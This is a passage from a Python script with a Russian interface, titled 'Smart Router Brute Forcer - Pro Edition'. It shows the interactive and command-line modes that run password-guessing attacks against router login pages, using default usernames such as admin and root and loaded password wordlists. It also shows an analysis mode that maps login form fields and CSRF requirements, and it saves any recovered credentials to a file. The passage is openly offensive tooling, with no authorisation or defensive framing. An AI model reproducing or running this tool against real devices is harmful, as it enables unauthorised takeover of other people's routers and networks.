        'user', 'User', 'USER', 'guest', 'Guest', 'GUEST'
    ]
    
    print(f"\n[+] Параметры подбора:")
    print(f"    URL: {url}")
    print(f"    Логинов: {len(usernames)}")
    print(f"    Паролей: {len(passwords)}")
    print(f"    Всего комбинаций: {len(usernames) * len(passwords)}")
    
    confirm = input("\nНачать подбор? (да/нет): ").strip().lower()
    if confirm not in ['да', 'д', 'yes', 'y']:
        print("[!] Отменено")
        return
    
    # Запуск
    bruteforcer = SmartRouterBruteForcer(url)
    result = bruteforcer.brute_with_analysis(usernames, passwords)
    
    show_stats(bruteforcer)

def file_password_mode():
    """Режим с загрузкой паролей из файла"""
    print("\n" + "="*70)
    print("📁 РЕЖИМ ЗАГРУЗКИ ПАРОЛЕЙ ИЗ ФАЙЛА")
    print("="*70)
    
    # Ввод URL
    url = input("\nВведите URL роутера: ").strip()
    if not url:
        print("[!] URL обязателен")
        return
    
    # Ввод файла с паролями
    password_file = input("Введите путь к файлу с паролями: ").strip()
    if not password_file:
        print("[!] Файл с паролями обязателен")
        return
    
    # Загрузка паролей
    passwords = load_wordlist(password_file)
    if not passwords:
        print("[!] Не удалось загрузить пароли")
        return
    
    # Стандартные логины
    usernames = ['admin', 'Admin', 'root', 'user', 'administrator']
    
    print(f"\n[+] Параметры подбора:")
    print(f"    URL: {url}")
    print(f"    Логинов: {len(usernames)}")
    print(f"    Паролей из файла: {len(passwords)}")
    print(f"    Всего комбинаций: {len(usernames) * len(passwords)}")
    
    confirm = input("\nНачать подбор? (да/нет): ").strip().lower()
    if confirm not in ['да', 'д', 'yes', 'y']:
        print("[!] Отменено")
        return
    
    # Запуск
    bruteforcer = SmartRouterBruteForcer(url)
    result = bruteforcer.brute_with_analysis(usernames, passwords)
    
    show_stats(bruteforcer)

def advanced_mode():
    """Расширенный режим с загрузкой обоих файлов"""
    print("\n" + "="*70)
    print("🔧 РАСШИРЕННЫЙ РЕЖИМ")
    print("="*70)
    
    # Ввод URL
    url = input("\nВведите URL роутера: ").strip()
    if not url:
        print("[!] URL обязателен")
        return
    
    # Файл с логинами
    username_file = input("Файл с логинами (Enter для стандартных): ").strip()
    if username_file:
        usernames = load_usernames_file(username_file)
        if not usernames:
            print("[!] Использую стандартные логины")
            usernames = ['admin', 'Admin', 'root', 'user', 'administrator']
    else:
        usernames = ['admin', 'Admin', 'root', 'user', 'administrator']
    
    # Файл с паролями
    password_file = input("Файл с паролями (обязательно): ").strip()
    if not password_file:
        print("[!] Файл с паролями обязателен")
        return
    
    passwords = load_wordlist(password_file)
    if not passwords:
        print("[!] Не удалось загрузить пароли")
        return
    
    print(f"\n[+] Параметры подбора:")
    print(f"    URL: {url}")
    print(f"    Логинов: {len(usernames)}")
    print(f"    Паролей: {len(passwords)}")
    print(f"    Всего комбинаций: {len(usernames) * len(passwords)}")
    
    # Предупреждение для больших словарей
    total_combinations = len(usernames) * len(passwords)
    if total_combinations > 10000:
        print(f"\n[⚠] ВНИМАНИЕ: {total_combinations} комбинаций!")
        print("    Это может занять много времени.")
        print("    Рекомендуется начать с небольшого файла паролей.")
    
    confirm = input("\nНачать подбор? (да/нет): ").strip().lower()
    if confirm not in ['да', 'д', 'yes', 'y']:
        print("[!] Отменено")
        return
    
    # Запуск
    print("\n" + "="*70)
    print("🚀 ЗАПУСК ПОДБОРА")
    print("="*70)
    
    bruteforcer = SmartRouterBruteForcer(url)
    result = bruteforcer.brute_with_analysis(usernames, passwords)
    
    show_stats(bruteforcer)

def analysis_only_mode():
    """Только анализ без подбора"""
    print("\n" + "="*70)
    print("🛠️  РЕЖИМ ТОЛЬКО АНАЛИЗ")
    print("="*70)
    
    url = input("\nВведите URL роутера: ").strip()
    if not url:
        url = "http://192.168.1.1"
    
    analyzer = RouterAnalyzer(url)
    requirements = analyzer.analyze()
    
    if requirements:
        print("\n" + "="*70)
        print("📋 РЕЗУЛЬТАТЫ АНАЛИЗА")
        print("="*70)
        print(f"URL роутера: {url}")
        print(f"Базовая страница: {analyzer.base_url}")
        print(f"Страница входа: {requirements['login_url']}")
        print(f"Метод входа: {requirements['method']}")
        print(f"Поле логина: {requirements['username_field']}")
        print(f"Поле пароля: {requirements['password_field']}")
        print(f"Производитель: {requirements['vendor'] or 'не определен'}")
        print(f"Преобразование пароля: {requirements['password_transform']}")
        print(f"CSRF токен: {'да' if requirements['needs_csrf'] else 'нет'}")
        print(f"Форма найдена: {'да' if requirements['form_found'] else 'нет'}")
        
        if requirements['additional_fields']:
            print(f"\nДополнительные поля формы:")
            for field, value in list(requirements['additional_fields'].items())[:10]:  # Показываем первые 10
                print(f"  {field}: {value[:50]}...")
            if len(requirements['additional_fields']) > 10:
                print(f"  ... и еще {len(requirements['additional_fields']) - 10} полей")
        
        print("\n[💡] Рекомендации для подбора:")
        print("1. Используйте URL выше для отправки запросов")
        print("2. Используйте указанные имена полей")
        print("3. Применяйте указанное преобразование пароля")
        
        # Сохранение результатов анализа
        save_analysis = input("\nСохранить результаты анализа в файл? (да/нет): ").strip().lower()
        if save_analysis in ['да', 'д', 'yes', 'y']:
            save_analysis_results(url, requirements)
    else:
        print("\n[✗] Анализ не удался")

def save_analysis_results(url: str, requirements: Dict):
    """Сохраняет результаты анализа в файл"""
    timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
    filename = f"analysis_{timestamp}.txt"
    
    try:
        with open(filename, "w", encoding="utf-8") as f:
            f.write("="*70 + "\n")
            f.write("РЕЗУЛЬТАТЫ АНАЛИЗА РОУТЕРА\n")
            f.write("="*70 + "\n\n")
            f.write(f"URL: {url}\n")
            f.write(f"Время анализа: {timestamp}\n\n")
            f.write("ПАРАМЕТРЫ ВХОДА:\n")
            f.write(f"  Страница входа: {requirements['login_url']}\n")
            f.write(f"  Метод: {requirements['method']}\n")
            f.write(f"  Поле логина: {requirements['username_field']}\n")
            f.write(f"  Поле пароля: {requirements['password_field']}\n")
            f.write(f"  Производитель: {requirements['vendor'] or 'не определен'}\n")
            f.write(f"  Преобразование пароля: {requirements['password_transform']}\n")
            f.write(f"  CSRF токен: {'да' if requirements['needs_csrf'] else 'нет'}\n\n")
            
            if requirements['additional_fields']:
                f.write("ДОПОЛНИТЕЛЬНЫЕ ПОЛЯ ФОРМЫ:\n")
                for field, value in requirements['additional_fields'].items():
                    f.write(f"  {field}: {value}\n")
        
        print(f"[💾] Результаты сохранены в {filename}")
    except Exception as e:
        print(f"[✗] Ошибка сохранения: {e}")

def create_example_files():
    """Создает примеры файлов"""
    print("\n" + "="*70)
    print("🛠️  СОЗДАНИЕ ПРИМЕРОВ ФАЙЛОВ")
    print("="*70)
    
    create_example_password_file()
    create_example_username_file()
    
    print("\n" + "="*70)
    print("[✓] Примеры файлов созданы!")
    print("="*70)
    print("\n[📁] Теперь у вас есть:")
    print("    - passwords.txt - файл с паролями")
    print("    - usernames.txt - файл с логинами")
    print("\n[💡] Как использовать:")
    print("    1. Запустите скрипт снова")
    print("    2. Выберите режим 2 или 3")
    print("    3. Укажите путь к созданным файлам")

def show_stats(bruteforcer):
    """Показывает статистику после подбора"""
    stats = bruteforcer.get_stats()
    
    print(f"\n" + "="*70)
    print("📊 СТАТИСТИКА ПОДБОРА")
    print("="*70)
    print(f"Цель: {bruteforcer.target_url}")
    print(f"Всего попыток: {stats['attempts']}")
    print(f"Успешных входов: {stats['successful']}")
    print(f"Затраченное время: {stats['time']:.1f} сек")
    print(f"Средняя скорость: {stats['speed']:.1f} попыток/сек")
    print(f"Блокировка обнаружена: {'да' if stats['blocked'] else 'нет'}")
    
    if stats['found']:
        username, password = stats['found']
        print(f"\n[🎉] УЧЕТНЫЕ ДАННЫЕ НАЙДЕНЫ!")
        print(f"    Логин: {username}")
        print(f"    Пароль: {password}")
        print(f"\n[💾] Результат сохранен в found_credentials.txt")
    else:
        print(f"\n[✗] Учетные данные не найдены")
    
    print("="*70)

# ==================== ЗАПУСК ПРОГРАММЫ ====================

def main():
    """Основная функция запуска"""
    print("""
    ╔══════════════════════════════════════════════╗
    ║   SMART ROUTER BRUTE FORCER - PRO EDITION   ║
    ║        с поддержкой файлов паролей          ║
    ╚══════════════════════════════════════════════╝
    """)
    
    # Проверка аргументов командной строки
    if len(sys.argv) > 1:
        if sys.argv[1] == "setup":
            create_example_files()
            return
        elif sys.argv[1] == "quick":
            quick_start_mode()
            return
        elif sys.argv[1] == "file" and len(sys.argv) > 2:
            # Быстрый запуск с файлом паролей
            url = sys.argv[2] if len(sys.argv) > 2 else "http://192.168.1.1"
            password_file = sys.argv[3] if len(sys.argv) > 3 else "passwords.txt"
            
            print(f"[🚀] Быстрый запуск:")
            print(f"    URL: {url}")
            print(f"    Файл паролей: {password_file}")
            
            passwords = load_wordlist(password_file)
            if passwords:
                usernames = ['admin', 'Admin', 'root', 'user']
                bruteforcer = SmartRouterBruteForcer(url)
                bruteforcer.brute_with_analysis(usernames, passwords)
                show_stats(bruteforcer)
            return
    
    # Основной интерактивный режим
    interactive_mode()

if __name__ == "__main__":
    main()